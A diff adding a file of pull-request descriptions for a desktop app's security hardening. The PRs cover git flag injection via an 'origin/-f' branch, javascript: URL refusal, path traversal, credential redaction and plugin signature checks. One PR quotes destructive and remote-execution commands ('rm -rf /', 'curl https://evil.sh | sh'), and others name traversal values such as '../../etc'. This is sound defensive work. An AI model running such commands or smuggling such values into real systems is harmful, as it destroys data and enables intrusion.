@@ -1,0 +1,720 @@
+=== PR 929 ===
+KhushiTrivediii
+Fixes #910
+
+### Changes
+- Replaces pre-extraction deletion with temporary extraction directory and atomic promotion/swap (promotePendingInstall) in ChromiumAutoDownloader.installFromCandidates so an extraction failure preserves any existing working engine.
+- Prevents silent fallback to Java ZipInputStream on macOS when native ditto extraction fails (which produces non-booting framework symlinks) by throwing an explicit exception.
+- Adds unit tests in ChromiumAutoDownloaderTest.
+=== PR 930 ===
+Mihir-Rabari
+DesktopGitService.checkout() validated the input branch name with isSafeRefName, then stripped the remote prefix and passed the STRIPPED result to git unchecked: a remote branch named origin/-f became git checkout -f -- and silently discarded all uncommitted work; a blank strip (origin/) produced an empty ref argument.
+
+Fix:
+- Re-run isSafeRefName on the stripped local name before invoking git - fail-closed on flag-shaped, blank, and oversized stripped names (the attack was reproduced empirically: a planted refs/remotes/origin/-f dirtied-tree checkout was refused, uncommitted work survived, HEAD unchanged)
+- BossTopBar.onCheckout now passes projectPathOverride like its six neighboring write verbs (companion finding)
+
+Test evidence: two new regression tests in GitProviderWritesToRepoTest covering the planted origin/-f attack (refusal + uncommitted work survives + HEAD unchanged) and the strips-to-empty case; all 22 tests in the class green. ktlint + detekt clean.
+
+Fixes #919
+=== PR 931 ===
+Mihir-Rabari
+The browser service accepted, executed, and logged javascript: URLs verbatim: Navigate passed any scheme to the engine, logged raw URLs including embedded userinfo credentials, emitted a bogus COMPLETED event for refused navigations, and Reload could wedge isLoading=true forever.
+
+Fix in modules/boss-app-browser:
+- Navigate gains a scheme allowlist (http, https, file, ftp); javascript:, data:, unknown, schemeless, and blank URLs are refused BEFORE any state write, event emission, or URL logging - no COMPLETED event, no slot update; the refusal log carries only the reason + scheme name at WARN, never the URL
+- Scheme parsing is engine-faithful per WHATWG: leading tab/newline/CR stripped, case-insensitive, RFC 3986 syntax - so tab-smuggled, uppercase, and NUL-prefixed javascript: schemes cannot walk the gate
+- navigate INFO and getFavicon DEBUG logs route URLs through LogSanitizer.redactUrlUserInfo - redaction is log-only; the response/event contract keeps full URLs
+- reload now emits the same synchronous STARTED then COMPLETED pair as navigate and stores isLoading=false - no more perpetual loading wedge
+
+Test evidence: 8 new tests in boss-app-browser BrowserServiceImplTest (allowlist acceptance + events, javascript/data refusal with no state or events, control-char and case smuggling refusal, schemeless/blank refusal, refusal leaves the current page intact, reload never wedges, contract not redacted, log-redaction wiring pinned) plus composeApp BrowserUrlLogConventionTest and BrowserServiceImplTest regressions green. ktlint + detekt clean.
+
+Fixes #911
+=== PR 932 ===
+abhinavlenka
+# 📋 Pull Request
+
+## Description
+`BrowserServiceImpl.navigate()` (modules/boss-app-browser) had no scheme gate: a `javascript:`
+or `data:` URL was accepted, logged verbatim at INFO (including any embedded credentials, e.g.
+`https://user:pass@host`), and reported back as a completed navigation. This adds a scheme
+check that refuses both schemes before any state/logging/events happen, and masks URL userinfo
+in the one log line that still prints a URL.
+
+Also fixes a companion bug the issue calls out in its own title: `reload()` set `isLoading = true`
+and nothing ever reset it, so `getPageInfo()` reported "loading" forever after the first reload.
+Fixed by mirroring the synchronous STARTED -> COMPLETED pattern `navigate()` already uses.
+
+Note on the suggested fix: the issue suggests routing logging through the existing
+`LogSanitizer.redactUrlUserInfo`. That class lives in composeApp; `boss-app-browser` is a
+separate GraalVM-native microkernel module with no dependency on the desktop app module, so I
+wrote a small local equivalent (`redactUrlUserInfo`) scoped to exactly what this log line needs,
+rather than adding a cross-module dependency for one function.
+
+## 🔄 Type of Change
+<!-- Check all that apply -->
+- [x] 🐛 **Bug fix** (non-breaking change that fixes an issue)
+- [ ] ✨ **New feature** (non-breaking change that adds functionality)
+- [ ] 💥 **Breaking change** (fix or feature that would cause existing functionality to not work as expected)
+- [ ] 🔧 **Configuration change** (changes to build scripts, CI/CD, or project configuration)
+- [ ] 📚 **Documentation** (documentation only changes)
+- [ ] 🧹 **Refactoring** (code change that neither fixes a bug nor adds a feature)
+- [ ] ⚡ **Performance improvement** (code change that improves performance)
+- [x] 🧪 **Tests** (adding missing tests or correcting existing tests)
+
+## 📦 Version Impact
+<!-- Check if this change requires a version increment -->
+- [ ] **No version change needed**
+- [x] **Patch version** (bug fixes, small improvements) - `x.x.+1`
+- [ ] **Minor version** (new features, enhancements) - `x.+1.0`  
+- [ ] **Major version** (breaking changes) - `+1.0.0`
+
+<!-- If version change is needed, it will be handled by our automated version management system -->
+
+=== PR 934 ===
+KhushiTrivediii
+Fixes #919.
+
+Re-validates the remote-prefix-stripped local branch name in DesktopGitService.checkout() with isSafeRefName(localName) to prevent branch names like origin/-f from being passed as option flags.
+=== PR 916 ===
+KhushiTrivediii
+Fixes #911
+
+### Changes
+- Refuses prohibited URL schemes in BrowserServiceImpl.navigate
+- Redacts URL credentials in logging
+- Fixes reload loading state in BrowserServiceImpl
+- Adds unit tests.
+=== PR 918 ===
+Mihir-Rabari
+Supabase-kt persists access and refresh JWTs through its default Settings(), which resolves to java.util.prefs.Preferences on JVM desktop - plaintext XML under ~/.java/.userPrefs on Linux, plist on macOS, registry on Windows.
+
+This installs Auth with an encrypted Settings backend instead:
+
+- AES-256-GCM per value with a fresh 96-bit IV per write; store under ~/.boss/supabase
+- 32-byte random key in a separate key file pinned to 0600 via atomicWriteText (mirrors the #860 hardening pattern); fail-closed on crypto unavailability or a corrupt key
+- One-shot migration copies the legacy plaintext Preferences session into the encrypted store and then destroys the plaintext copy - existing sessions survive, and the live plaintext refresh token is actually revoked (previously logout was the only revocation path)
+- Auth flows untouched - initialize() gained a defaulted sessionSettings parameter so every call site is unchanged
+
+Test evidence: EncryptedSessionSettingsTest adds 10 tests - Auth receives the encrypted backend (reflection assertSame), roundtrip + restart survival, raw persisted bytes contain neither tokens nor key material and the key file is 0600, tampered values decrypt to null, remove/clear purges disk, legacy migration + plaintext destruction, encrypted-wins-over-stale-legacy. All 42 pre-existing tests in the package stay green (52/52). ktlint + detekt clean.
+
+Fixes #846
+=== PR 904 ===
+KhushiTrivediii
+Fixes #885
+
+### Changes
+- Replaces in-place file write with atomic temp file + atomic move (^GtomicWriteText) in EditorServiceImpl.saveFile to prevent torn writes on crash.
+- Canonicalizes all paths before validation (File.canonicalFile) to resolve symlinks and path traversal attempts.
+- Restricts path access to allowed confinement roots (user.home and java.io.tmpdir).
+- Enforces cross-platform blocked system path validation (/etc, /sys, /proc, C:\Windows, C:\Program Files, SystemRoot).
+- Adds unit tests in EditorServiceImplTest.
+=== PR 878 ===
+KhushiTrivediii
+Fixes #813
+
+## Summary
+- Removed dead `private var refreshJob: Job? = null` field.
+- Introduced `private val refreshMutex = Mutex()` in `DesktopGitService.kt`.
+- Wrapped `refresh(projectPath)` body inside `refreshMutex.withLock` to serialize concurrent refreshes.
+- Wrapped `clear()` state resets inside `runBlocking { refreshMutex.withLock { ... } }` to prevent in-flight refreshes from overwriting zeroed state.
+- Added regression tests in `GitRefreshConcurrencyTest`.
+
+=== PR 908 ===
+Mihir-Rabari
+Fixes #851.
+
+`ApiClassLoader.fromPluginDir` installs the newest jar claiming `pluginId=ai.rever.boss.plugin.api` — previously with no signature/hash/bundled-trust check, even though that jar becomes the **parent classloader of every plugin** (an unsigned GitHub-fallback download or a nulled-signature jar would win on version alone). The new gate:
+
+- Candidates keep the existing validation (manifest-valid, api-claiming, semver-parsable) and sort newest-first; the **first jar passing a fail-closed gate wins**.
+- Present-but-invalid sidecar **always rejects**. Missing sidecar requires a **bundled-trust marker matching the jar bytes** or dev mode (`boss.dev.mode` — the same carve-out plugin loads use). No rollout warn-path here: the api jar outranks every plugin, which was the exact hole.
+- A newer unverifiable jar neither wins nor shadows an older verified one; if none verifies, the loader degrades to empty (host-compiled classes only).
+
+Reuses the platform's existing verification utilities (`PluginSignatureSidecar`, `PluginBundledTrust`, `FileHashing`, `PluginStoreTrust.versionAnchor` + pinned keys, `PluginSignatureVerifier`) — no new crypto.
+
+**Verification** (JDK 17, --offline): `:plugin-platform:plugin-loader:desktopTest` — **144 tests / 0 failures** across 19 suites, including 11 new `ApiClassLoaderVerificationTest` cases pinning: newest unverifiable / version-substitution-signed / invalid-version-claim jars NOT installed; validly-signed + bundled-trust jars still install; fail-closed on missing proof, corrupt sidecar, untrusted key, tampered bytes, stale bundled marker; dev-mode carve-out. `ktlintCheck` + `detekt` clean.
+
+=== PR 913 ===
+Mihir-Rabari
+Fixes #847. Fixes #848.
+
+Both issues are the same class — non-terminal `boss://` deep links dispatch without the origin gating `boss://terminal` already has — and both are now gated, each with the remedy that fits its blast radius:
+
+- **`boss://plugin` (#847)** — action links from non-operator origins are **refused centrally** in `DeepLinkHandler` before any handler code sees them (`pluginActionDisposition`, new pure gate; WARN log + refused verdict). Refusal rather than a confirm dialog: a plugin action's effect is unknowable handler code, so a prompt would be confirmation theater. Panel-open links (no `action`) stay ungated; in-app callers dispatch via `DeepLinkActionRegistryImpl` directly, unaffected; there is no `boss plugin` CLI command, so no native path changed.
+- **`boss://workspace` (#848)** — the full terminal-style confirmation flow: `CLICommand.LoadWorkspace` now carries its origin (default `EXTERNAL` — absence is not neutral); the workspace readiness queue holds whole commands so cold-start loads stay attributed; the window collector applies the new pure `spaceLoadDisposition`: LOAD for operator/CLI origins or command-less spaces (behavior unchanged), **CONFIRM** for external + command-carrying loads — the held Space goes to a new `SpaceLoadApprovalQueue` shown in a new `SpaceLoadApprovalDialog` listing the file path and every terminal command, applied verbatim on confirm — and REJECT for malformed payloads, >512 chars, >16 commands (mirroring `terminalCommandDisposition`'s shape rules).
+
+Internal/native launches keep working exactly as before — the gate mirrors how `boss://terminal` distinguishes them.
+
+**Verification** (JDK 17, --offline): targeted `:composeApp:desktopTest` — **130 tests / 0 failures** across 14 classes, including new `PluginActionOriginTest` (4) + `SpaceLoadDispositionTest` (6). Root `ktlintCheck` (all modules) + `:composeApp:detekt` clean. Two existing fixtures (`DeepLinkRoutingTest`, `SingleInstanceChannelTest`) were updated because they genuinely encoded the unsafe behavior — they now drive the OPERATOR_CLI-labeled path they were actually about, plus explicit external-refused assertions. `AGENTS.md`'s ungated-surfaces list updated to match reality.
+
+=== PR 903 ===
+KhushiTrivediii
+## Summary
+
+The MCP approval pipeline evaluated tool risk **without the invocation's arguments**, and **never ran the risk evaluator at all** when a standing ALLOW existed. A single "Always Allow" / "Trust this plugin" / session-trust grant therefore permitted unattended execution of commands the risk evaluator itself rates CRITICAL — e.g. `rm -rf /` or `curl https://evil.sh | sh` under an ALLOW on `run_command`.
+
+Fixes #895.
+
+## Root cause
+
+1. **`McpPolicyEngine.policyFor` evaluated risk with empty args** (`McpPolicyEngine.kt:224` — `evaluateRisk(toolName, McpToolArgs(emptyMap()))`), so the default-resolution step could not see destructive command patterns in the actual invocation.
+2. **The ALLOW branch in `authorizeInvocation` returned `AUTO_ALLOWED` with zero risk evaluation** (`McpToolRegistryImpl.kt:963-964`); `confirmInvocation` checked only revocation/DENY.
+3. **The argument-aware evaluation ran only inside the ASK branch** (`McpToolRegistryImpl.kt:974`) and was **display-only** — it never gated.
+4. **Doc mismatch**: `WorkspaceMcpToolProvider.kt:806-808` claimed the risk evaluator runs "on every call" — it did not once any ALLOW existed.
+
+## Changes
+
+### `McpPolicyEngine.kt`
+- Added optional `args: McpToolArgs? = null` parameter to `policyFor()`.
+- At the default-resolution step, uses `args ?: McpToolArgs(emptyMap())` instead of hardcoded `McpToolArgs(emptyMap())`, so the risk evaluator can see the real command and classify destructive patterns as CRITICAL.
+- Backward compatible: callers without args get the previous empty-args behaviour.
+
+### `McpToolRegistryImpl.kt`
+- Passes the invocation's real `args` to `policyFor` in `invoke()`.
+- After resolving policy, if it is `ALLOW`, re-evaluates risk with real args. If the risk level is `CRITICAL`, escalates to `ASK` so the operator reviews the specific arguments before the call runs.
+- The ledger records the effective policy (post-escalation), so an escalated call shows `ASK` not `ALLOW`.
+- Added `McpRiskLevel` import.
+
+### `WorkspaceMcpToolProvider.kt`
+- Updated the `handleOpenTerminal` KDoc to reflect that the risk evaluator now actually runs on every call including ALLOW paths.
+
+### Tests
+
+**`McpCriticalReAskTest.kt`** (new, 8 tests):
+- `policyFor` with empty args evaluates `run_command` as HIGH (mutating default)
+- `policyFor` with destructive args evaluates `run_command` as CRITICAL
+- `policyFor` with benign args still evaluates `run_command` as HIGH
+- `policyFor` with empty args is backward compatible
+- Standing ALLOW with CRITICAL args escalates to ASK (persisted rule)
+- Standing ALLOW with benign args still auto-allows
+- Session trust with CRITICAL args escalates to ASK
+=== PR 902 ===
+Mihir-Rabari
+Fixes #896.
+
+`workspacePath` now resolves strictly inside the default workspaces directory (canonicalized on both sides — defeats `..` and symlink escapes — fail-closed); loaded layouts run `projectPath` and every terminal `workingDirectory` through the existing project-path gate before apply; `createIfAbsent` surfaces persist failures ("Failed to persist the new workspace; nothing was saved.") instead of silent success; a window that never registered UI state is an honest error instead of a silent no-op. Templates and freshly-created workspaces are exempt by construction (placeholders / not-yet-existing directories).
+
+**Verification** (JDK 17, --offline): `WorkspaceMcpToolProviderTest` **48/48** (7 new tests: outside-dir + traversal + `/etc/passwd` refusals, id-based and `workspacePath`-based traversal refusal, terminal `workingDirectory` gate, directory-squat persist failure, valid-file success, cold-start honest error) + `OpenTargetPathTest` **6/6**; ktlint clean (`canonicalOnIo` signature reformatted to ktfmt style).
+
+=== PR 900 ===
+Mihir-Rabari
+Fixes #895.
+
+The policy consult now carries the real `McpToolArgs` instead of an empty stand-in. ALLOW paths (persisted rule, provider trust, session trust) re-ask when this call's arguments are what rate it CRITICAL (argument-free baseline below CRITICAL); intrinsically-CRITICAL tools keep their grants; read-only tools stay auto-allowed. Fail-closed: evaluator deny/timeout/queue-full block the handler.
+
+Builds on the name/readOnly classification layer (#808) and the session-trust scoping (#815).
+
+**Verification** (JDK 17, --offline): **299 tests passed, 0 failed** across the keep-green batch (31 suites — all `ai.rever.boss.mcp.*` + `mcp.sandbox.*` + the 6 UI/plugin/search suites that touch MCP). ktlint green on all source sets. New test class `McpStandingAllowRiskArgsTest` (6 tests) pins: argument-driven re-ask under persisted ALLOW / provider trust / session trust; no re-ask for read-only tools; no re-ask for intrinsically-CRITICAL tools with grants; fail-closed on evaluator deny/timeout. `WorkspaceMcpToolProviderTest` restructured its newline-command fixture to approve the new re-ask while still pinning the shape-check refusal.
+
+=== PR 890 ===
+nitininhouse
+# 📋 Pull Request
+
+## Description
+
+Fixes #886. Follow-up to #837, on `dev`.
+
+#640 added `LogSanitizer.redactUrlUserInfo` and used it to redact URI credentials before logging.
+`McpArgumentSanitizer` is a separate sanitizer and never picked it up, so the same password is
+hidden in a log entry and visible in the MCP ledger:
+
+```
+a database password in a log entry   ->  hidden   (since #640)
+the same password in the MCP ledger  ->  visible
+```
+
+A credential in a URI authority has no sensitive key name, no assignment and no recognisable token
+prefix, so none of the existing rules here saw it. `postgres://admin:hunter2@host` has a colon, but
+it is not an assignment and `hunter2` has no prefix to match on.
+
+This calls the helper #640 already added rather than adding a rule of its own:
+
+```kotlin
+fun sanitizeMessage(text: String): String =
+    LogSanitizer
+        .redactUrlUserInfo(text)
+        .replace(credentialShapePattern, "[REDACTED]")
+        ...
+```
+
+`curl -u user:pass` is not a URI, so it keeps a small rule of its own. Its `(?!//)` guard is
+load-bearing: `redis-cli -u` takes a URL, and without it `-u redis://cache.example.invalid:6379`
+matches with `redis` as the user and the rest as the secret, blanking a line that holds no
+credential at all.
+
+## Why reuse rather than a local rule
+
+I wrote a local regex first, and it was worse in a way worth recording. A password containing an
+`@` is ordinary, and stopping at the first `@` leaves its tail behind:
+
+=== PR 901 ===
+Mihir-Rabari
+Closes the remaining raw-exception passthroughs missed by #771: route-level catches in the plugin-store publish routes and the passkey challenge/auth storage utils now return fixed envelopes (`Failed to store challenge`, `Could not determine repository visibility`, etc.) instead of interpolating raw exception text. Raw driver and PG details (the PGRST204 "column does not exist" leak class) stay on server-side `console.error`. Business messages pinned by the existing suites are unchanged.
+
+Fixes #770.
+
+**Verification** (Deno 2.9.7): passkey `deno check` clean, **159/159** tests passing (baseline 158 held, plus a new PGRST204 envelope test that fails on pre-fix code); plugin-store `deno check` clean, **65/65** (baseline 64 held, plus a new `/github/metadata` envelope test that fails on pre-fix code). Both new tests assert the diagnostic text reaches the server-side `console.error` spy while staying absent from the response body.
+
+=== PR 906 ===
+Mihir-Rabari
+Fixes #852.
+
+The three follow-ups from the issue, in the existing code style (fixed envelopes, no new deps):
+
+- **Viewer-scoped detail route** — `/:pluginId` now threads the optional viewer through `getPlugin`/`getPluginVersions` (branching to the service-role-only `get_plugin_with_stats_for_viewer` / `get_plugin_versions_for_viewer` RPCs, mirroring `/list`'s existing branch) and sends the same viewer-dependent `Cache-Control: private, no-store` header, since the response now depends on who asked. Anonymous callers keep the original RPCs and behavior.
+- **Rate limiting on public catalogue routes** — `/list`, `/search`, `/tags/popular` (shared `catalogue:` budget) and both download-info routes (separate `download-info:` budget): 60 req/min per client, matching the org function's existing admin-write brake. 429 + `Retry-After` + fixed error envelope, consumed before any DB work. 429 responses added to the OpenAPI route specs. The rate-limit util is a verbatim copy of `organisation/utils/rate-limit.ts` — cross-function imports don't exist in this repo, so copies are the established convention.
+- **CORS localhost gating** — new `utils/cors.ts` mirrors passkey's `isLocalDevEnvironment`: `http://localhost:3000` is admitted only when `SUPABASE_URL` is loopback or an operator sets `PLUGIN_STORE_ALLOW_LOCALHOST`.
+
+**Verification** (Deno 2.9.7): `deno check index.ts routes/*.ts` clean; `deno test --allow-all` — **67 passed / 0 failed** (baseline 64/0 held + 3 new tests in `tests/hardening.test.ts`: viewer RPC selection + cache headers; 60-in/61st-out 429 with per-client isolation, shared catalogue budget, and download-info limiting; CORS origin env-gating).
+
+=== PR 898 ===
+KhushiTrivediii
+Fixes #886
+
+### Changes
+- Adds pattern matching in McpArgumentSanitizer to redact URI authority credentials, curl user flags, AWS access key IDs, and PEM private keys.
+- Adds unit tests in McpGovernanceReviewTest.
+=== PR 899 ===
+dilatedtime
+## Summary
+- bound `Rebuilt`, `Quarantined`, and `Settling` fault refunds to one fixed recovery-incident deadline
+- re-anchor an incident after the same 4-second quiet gap used by the recovery state machine
+- assign each recorded failure an exact per-thread token, so concurrent windows cannot refund one another's faults
+- log expired recovery allowances and release an unmounted suspect once its settle grace expires
+- add policy, concurrency, slow-cadence, seam, and lifecycle regression coverage
+
+## Context
+
+This is a focused follow-up to the completed post-merge review on #750. The original blockers in that PR are closed; this addresses the review's non-blocking findings around unbounded visible-progress refunds, stale incident anchors, discarded refund verdicts, and cross-thread deque refunds. It also closes the adjacent stale-quarantine case found while exercising the empty-mounted-set path.
+
+## Validation
+- `:composeApp:desktopTest` for `RenderCrashPolicyTest`, `RenderRecoverySeamTest`, `WindowExceptionRouteTest`, and `RenderRecoveryToastTest`
+- complete `:plugin-platform:plugin-sandbox:desktopTest`
+- `:composeApp:ktlintCheck :composeApp:detekt`
+- `:plugin-platform:plugin-sandbox:ktlintCheck :plugin-platform:plugin-sandbox:detekt`
+- four mutation checks: each new regression test fails when its corresponding old behavior is restored
+- complete `:composeApp:desktopTest` ran 5,681 tests; only the two symlink-creation cases (`DesktopFileScannerTest` and `DiscardDownloadContainmentTest`) failed with Windows `FileSystemException`, with 19 skipped. The focused recovery suite passes on the final tree.
+=== PR 894 ===
+Mihir-Rabari
+## What
+
+Contract tests for the v9.5.21 `UserDataStorage` auth-persistence hardening (the Mutex + `atomicWriteText` + pending-marker recovery paths). **Test-only — no source changes.**
+
+## Coverage (new `UserDataStorageMergeTest`, 10 tests, hermetic seam copied from `UserDataStorageWizardTest`)
+
+1. **Merge contract** (5 tests): pending wizard marker merged into the fresh record + consumed; stored flag survives an identity-replacing save; OR-semantics pinned in both directions; a corrupt record doesn't block the marker merge (the recovery path).
+2. **clearUserData under lock** (2): deterministic generation-fence — a save entered pre-logout recreates neither the record nor consumes the pending marker; wizard-vs-logout race (25 rounds) with a serialization-independent invariant.
+3. **Lost-update regression** (1): 2 `saveUserData` + 12 `setPluginWizardCompleted(true)` racing through a start-gate × 20 rounds — the flag is never lost and the marker always consumed. Invariants hold for every legal Mutex serialization, so there's no scheduling flake.
+4. **Torn-write protection** (2): concurrent reader thread decoding `user_data.json` while 48 writers race — only `SerializationException` counts as torn (transient Windows sharing-violation `IOException` tolerated, matching the CI windows-latest matrix); atomic temp+move leaves no `.tmp` strays or consumed markers.
+
+## Testing
+
+- `UserDataStorageMergeTest` **10/10**
+- `UserDataStorageWizardTest` **4/4**
+- ktlint + `:composeApp:detekt` clean
+
+## Note
+
+Pins an apparent intentional behavior: `clearUserData()` deletes `user_data.json` but preserves the pre-login `pending_wizard_completed` marker, so a pre-login wizard run survives logout (per the marker's documented pre-login semantics). No bugs found in `UserDataStorage.kt` — the generation fence, mutex, and atomic writes held up under every deterministic and adversarial race.
+
+=== PR 893 ===
+Mihir-Rabari
+## What
+
+The v9.5.21 workspace tool family landed in the mutating catalog but never in the risk evaluator's classification sets, so every risk surface (policy dialogs, activity log) showed them as "Unclassified — defaulting to low risk" — including the six **mutating** lifecycle tools. Worse, boss-prefixed calls (`mcp__boss__open_workspace`) missed both the catalog (bare-name keys) and the evaluator, landing on the read-only ALLOW default in `policyFor`.
+
+## Changes
+
+- `McpRiskEvaluator.kt`: `list_workspaces` / `workspace_list` → `READ_ONLY_TOOLS` (LOW); the six lifecycle names (`open_workspace` / `create_workspace` / `close_workspace` + `workspace_*` aliases) → a new `WORKSPACE_MUTATION_TOOLS` set mapped flat **HIGH** (these tools take no `command` argument, so folding them into `SHELL_TOOLS` would emit a false "allows arbitrary command execution" reason).
+- `McpRiskEvaluatorTest`: the old `knownLowRiskMutatingTools` ledger pinned this exact drift — replaced with a full catalog↔evaluator sync assertion (`mismatches.isEmpty()`).
+- New `McpRiskEvaluatorWorkspaceToolsTest`: pins all 10 names (bare + `mcp__boss__`-prefixed) to expected tiers with explicit no-Unclassified assertions, plus the terminal pair's command-wording CRITICAL escalation.
+
+## Testing
+
+- `McpToolSandboxTest` 10/10
+- `McpRiskEvaluatorWorkspaceToolsTest` 5/5 (new)
+- `McpRiskEvaluatorTest` 23/23
+- `WorkspaceMcpToolProviderTest` 43/43
+
+All green (JDK 17, `--offline`).
+
+## Scope note
+
+Prefix handling in `McpPolicy` itself was deliberately left untouched — bare-name + suffix matching is pinned behavior, and boss-prefix stripping is the evaluator's job.
+
+=== PR 884 ===
+ninja-lifts
+The host re-injects page helpers on every main-frame `NavigationFinished`, and that event fires for a single-page app's `pushState`/`replaceState` too, which is the same document rather than a new one. `BrowserHandleImpl.kt:1274` already says so, for the capture tracker one gate above:
+
+```kotlin
+// NavigationFinished fires for pushState/replaceState too, and Google Meet
+// rewrites its URL DURING a call ...
+if (event.isInMainFrame && !event.isSameDocument) {   // :1278  capture tracker
+...
+if (event.isInMainFrame) {                            // :1294  injection
+```
+
+Three of the four injected helpers guard against being installed twice. The field-detection script did not:
+
+| Helper | Guard |
+|---|---|
+| Cmd+Click handler | `window._cmdClickHandlerAdded` |
+| interaction collector | `__bossInteractionStarted` |
+| co-browse recorder | starts once per page |
+| field detection | none |
+
+So every client-side route change added another pair of capture-phase `focusin`/`focusout` listeners to the same document, permanently, and another copy of the per-focus console line. The harness that landed with #609 already pinned it at two listeners after one injection and four after two; it now pins two after both.
+
+Two more from the same script, both named as follow-ups by that same harness.
+
+The `focusout` timer dereferenced `document.activeElement.tagName` unguarded. `activeElement` is nullable per spec, and when it was null the timer threw, so `__BOSS_FOCUSED_FIELD` kept pointing at the field that had just been blurred, which is the one case the deferred clear exists for. A null `activeElement` means focus went nowhere, so the field is released.
+
+The script logged the type and the name or id of every focused field to the page console for the life of the document, and logged a line on each injection. That put the user's form identity into a surface the page can read back, multiplied by every re-injection. Both lines are gone.
+
+## Verification
+
+CI already runs the harness as `node scripts/test/test-form-field-detector.js` (`build.yml:127`).
+
+| Step | Result |
+|---|---|
+| red, against unmodified dev | 5 checks fail |
+| green | 32 checks pass |
+| checks run on dev, for comparison | 32, so no coverage was dropped |
+| mutation: remove the guard | fails the listener count only |
+| mutation: restore the focus log | fails the console assertions only |
+| mutation: restore the unguarded dereference | fails both null-safety assertions |
+=== PR 888 ===
+ninja-lifts
+`docs/SECRET_BROWSER_INTEGRATION.md` was marked "Implemented" and described a host-owned feature across eight Kotlin files. **Five of them no longer exist**, and it quotes line numbers inside one of the five (`JxBrowserCompose.kt`). It also gives `FormFieldDetector.kt` a path under `components/plugin/tab_types/fluck/`, which resolves to nothing; the file is under `plugin/browser/`.
+
+The feature moved out of this repository. The host detects which field was right-clicked and publishes it as `BrowserContextMenuInfo.formFieldInfo`; a plugin in `boss_plugins` owns the menu, the matching, the dialog and the fill.
+
+## What changed
+
+The Architecture section is rewritten against the tree rather than patched: a table of what this repo still owns and the state of each piece, the four steps a right-click takes to reach a plugin, and the survivors that are present but unwired.
+
+Two of those are worth knowing before touching this area:
+
+- `FormFieldDetector` still installs `window.__BOSS_FOCUSED_FIELD` and `window.__BOSS_GET_FOCUSED_FIELD` on every navigation, but the live path reads `document.activeElement` itself and never touches them. Its own `getCurrentFocusedField` and `findAllFormFields` have no in-repo caller.
+- `WebsiteMatchingUtil` is reached only from `BrowserSecretIntegrationViewModel`, which nothing constructs. Its scoring is pinned by `WebsiteMatchingAuthorRegressionTest` and depended on by nothing.
+
+It also records that `FormFieldDetector.FormFieldInfo` is a **different type** from the published `FormFieldInfo` plugins receive, which is easy to miss when both names appear in one file.
+
+The sections after Architecture describe behaviour rather than code, so they are kept, and the header now says they were written against the original implementation and that their internals are historical.
+
+## Verification
+
+Every path and symbol the rewritten sections name was checked against the tree: the five "still here" files resolve, the five "gone" files are absent, and `getFormFieldInfoFromJS`, `FormFieldType`, `formFieldInfo`, `injectFormDetectionScript`, `FieldType`, `findAllFormFields` and `WebsiteMatchingAuthorRegressionTest` all exist where stated.
+
+No em-dash is added, so the `build.yml` markdown gate stays green. Docs only, no code touched.
+
+Related: #884 repairs the re-injection guard on the `FormFieldDetector` script this document describes.
+=== PR 909 ===
+KhushiTrivediii
+## Summary
+
+Fixes #886
+
+A credential inside a URI authority (`scheme://user:password@host`) passed through `McpArgumentSanitizer.sanitizeMessage` unmasked, reaching both the approval dialog and the MCP operation ledger (which appends to disk). The logging path already had `LogSanitizer.redactUrlUserInfo` (added in #640) to handle this, but the MCP argument path never called it.
+
+This meant the same database password that was hidden in logs was visible in the MCP ledger file — **CWE-532**.
+
+## Leaking cases (before fix)
+
+| Input | Output (before) |
+|---|---|
+| `psql postgres://admin:***@host/app` | password visible |
+| `mongosh mongodb+srv://svc:***@host/db` | password visible |
+| `redis-cli -u redis://default:***@host:6379` | password visible |
+| `git clone https://nitin:hunter2@git/host/repo` | password visible |
+| `curl -u admin:hunter2 https://host` | password visible |
+
+## Changes
+
+### 1. Reuse `LogSanitizer.redactUrlUserInfo` (not a second regex)
+
+Called as the **first** step in `sanitizeMessage`. This reuses the existing, tested URI parser from #640 rather than writing a second dialect. It correctly handles:
+- Passwords containing `@` (uses LAST `@` in authority as delimiter, per WHATWG URL parsing)
+- Nested URLs in query/fragment values
+- Preserves scheme, host, port, and path
+
+### 2. `curlUserOption` regex for `curl -u` / `curl --user`
+
+`curl -u user:pass` is not a URI, so `redactUrlUserInfo` does not catch it. Added a dedicated regex that preserves the username and redacts only the password after the colon.
+
+## Tests (`McpArgumentSanitizerUriCredentialTest.kt`, 15 tests)
+
+**URI userinfo redaction (8 tests):**
+- postgres / mongodb / redis / https URI passwords redacted
+- URI with `@` in password fully redacted (last-`@` delimiter)
+- URI without credentials unchanged
+- Multiple URIs in one command all redacted
+- URI credential inside quoted argument redacted
+=== PR 907 ===
+KhushiTrivediii
+## Summary
+
+Fixes #873
+
+Three security vulnerabilities in `SnapshotManager`:
+
+### 1. Path Traversal via Unvalidated `processId`
+
+`snapshotDir()` constructed paths via `File(dataDir, "snapshots/$processId")` with no validation. A `processId` like `../../etc` escaped the snapshots directory, allowing:
+- Arbitrary file creation (`save()`)
+- Arbitrary file deletion (`cleanup()` lists `.snapshot` files and calls `file.delete()`)
+- Arbitrary file reads (`loadLatest()`, `listSnapshots()`)
+
+**Fix:** Validate `processId` against `^[A-Za-z0-9_-][A-Za-z0-9._-]{0,199}$` (rejects path separators, double-dots, blank strings, trailing dots). Additionally verify the canonical resolved path stays within the snapshots base directory (defence in depth). Read-only operations (`loadLatest`, `listSnapshots`, `cleanup`) use `resolveSnapshotDir()` which returns `null` for invalid IDs instead of throwing.
+
+### 2. Non-Atomic File Truncation
+
+`save()` used `writeBytes()`/`writeText()` directly, so a crash mid-write left a truncated `.snapshot` file. `loadLatest()` picks the max-timestamp file, meaning recovery would select the corrupt partial file and fail.
+
+**Fix:** Write to a temp sibling (`.name.tmp`) first, then atomically move into place via `ATOMIC_MOVE` (with `REPLACE_EXISTING` fallback for cross-volume on Windows). The target file is never visible in a partial state.
+
+### 3. Umask-Inherited Permissions
+
+Snapshot files (which may contain sensitive process state, environment variables, or config) were written with default umask permissions (0644), readable by other local users on multi-user systems.
+
+**Fix:** Create temp files with POSIX owner-only permissions (`rw-------`) via `Files.createFile` with a `PosixFileAttribute`, and re-assert 0600 before the move. Non-POSIX platforms (Windows) silently skip the permission setting.
+
+## Changes
+
+**`SnapshotManager.kt`** (rewritten, 91 → 231 lines):
+- Added `processIdPattern` regex and validation in `snapshotDir()`
+- Added `resolveSnapshotDir()` for read-only operations (returns null for invalid)
+- Added `atomicWrite()` / `atomicWriteText()` with temp-file + `ATOMIC_MOVE` + POSIX 0600
+- Updated `save()`, `loadLatest()`, `listSnapshots()`, `cleanup()` to use new methods
+- Added `supportsPosix` detection
+
+## Tests (`SnapshotManagerTest.kt`, 12 → 30 tests)
+
